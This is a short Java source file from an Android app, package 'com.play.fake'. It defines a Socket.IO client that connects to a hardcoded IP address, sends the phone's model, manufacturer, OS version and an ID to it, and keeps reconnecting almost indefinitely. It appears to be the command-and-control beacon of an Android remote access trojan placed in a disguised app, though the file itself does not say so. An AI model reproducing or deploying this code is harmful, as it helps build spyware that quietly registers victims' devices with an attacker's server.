package com.play.fake;

import android.os.Build;

import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.UUID;

import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    public static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;


    private IOSocket() {

        String deviceID = null;
//        deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
        try {
            //Device ID is always null, and throwing errors
            //Using UUID instead
            String uniqueID = UUID.randomUUID().toString();
            deviceID = uniqueID;

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            String params = URLEncoder.encode(Build.MANUFACTURER, "UTF-8");
            ioSocket = IO.socket("http://192.168.43.157/?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+params+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        } catch (URISyntaxException | UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

}
